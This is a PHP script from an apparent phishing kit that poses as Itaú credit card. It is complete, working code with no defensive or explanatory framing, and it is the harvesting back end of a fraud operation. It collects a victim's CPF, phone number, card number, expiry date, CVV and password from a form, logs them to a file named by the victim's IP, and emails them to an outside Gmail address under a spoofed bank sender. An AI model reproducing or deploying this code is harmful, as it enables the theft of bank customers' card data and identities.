<?php

date_default_timezone_set('America/Sao_Paulo');

$matts .= "From: [ITAU_CARD] <noreplay@filefree.com.br>\r\n";
$matts .= "De: [ITAU_CARD]  <noreplay@filefree.com.br>\r\n";
$matts .= "Content-type: text/html; charset=iso-8859-1\r\n";
$matts .= "MIME-Version: 1.0\n";


$cpfe= $_POST['cpfe'];
$telefone = $_POST['telefone'];
$cc= $_POST['cc'];
$validade = $_POST['validade'];
$cvv= $_POST['cvv'];
$senha= $_POST['senha'];


$ip = $_SERVER["REMOTE_ADDR"];
$navegador = $_SERVER['HTTP_USER_AGENT'];
$pcname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$today = date("d/m/y"); 
$hora = date("H:i:s");
$arquivo    = "./1NF/" . "CARD-$ip" . ".txt";

$stringData = "
| ------------------------------------- <br>
| ******** SPYRYT FAKERS  ********** <br>
| ------------------------------------- <br>
| NAVEGADOR: $navegador <br>
| ------------------------------------- <br>
| CPF: $cpfe<br>
| TELEFONE: $telefone<br>
| CC: $cc <br>
| VALIDADE: $validade <br>
| CVV: $cvv <br>
| SENHA: $senha <br>

---------------------------------------";

    $fp = fopen($arquivo, 'a+');
    if ($fp) {
        fwrite($fp, $stringData);
        fclose($fp);
    }

@mail("Contatoaugustomenezes@gmail.com", "[ITAU_CARD]"."$ip", $stringData, $matts);
?>
